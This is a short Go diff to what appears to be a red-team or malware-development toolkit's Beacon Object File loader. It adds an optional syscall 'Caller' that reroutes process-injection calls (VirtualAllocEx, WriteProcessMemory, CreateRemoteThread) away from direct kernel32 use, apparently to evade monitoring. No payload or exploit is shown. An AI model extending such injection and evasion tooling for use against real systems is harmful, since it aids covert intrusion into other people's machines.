@@ -12,6 +12,8 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // COFF machine type for x64.
@@ -126,6 +128,13 @@ type BOF struct {
 	// survive past the BOF entry frame. Lazily allocated on first
 	// Alloc, reset between Executes — same shape + scope as kv.
 	formats *formatBufStore
+
+	// caller routes the cross-process Beacon API primitives
+	// (BeaconInjectProcess: VirtualAllocEx + WriteProcessMemory +
+	// CreateRemoteThread) through *wsyscall.Caller when non-nil.
+	// nil falls back to the direct kernel32 path. Mirrors the
+	// inject/ package convention.
+	caller *wsyscall.Caller
 
 	// outputSnapshot pins the bytes BeaconGetOutputData returns to the
 	// BOF for the remainder of the BOF call. Used by host-side wrappers
@@ -309,6 +318,23 @@ func (b *BOF) SetSpawnTo(path string) {
 		return
 	}
 	b.spawnToCStr = append([]byte(path), 0)
+}
+
+// SetCaller installs an optional *wsyscall.Caller for the BOF's
+// cross-process Beacon API primitives (BeaconInjectProcess and the
+// inject/spawn combos). nil — the default — keeps the direct
+// kernel32 path (VirtualAllocEx / WriteProcessMemory /
+// CreateRemoteThread). Same convention as inject/.
+//
+// Has no effect on the in-process loader path itself (relocations,
+// the entry call, BeaconPrintf, etc.). The Caller only re-routes
+// the three kernel32 calls the BOF can drive via BeaconInjectProcess.
+//
+// The Caller's lifetime is operator-owned: BOF.Close does NOT call
+// caller.Close — the same Caller is typically shared across many
+// BOFs and inject sites and must outlive all of them.
+func (b *BOF) SetCaller(c *wsyscall.Caller) {
+	b.caller = c
 }
 
 // SetSpawnToX86 configures the path BeaconGetSpawnTo returns when the
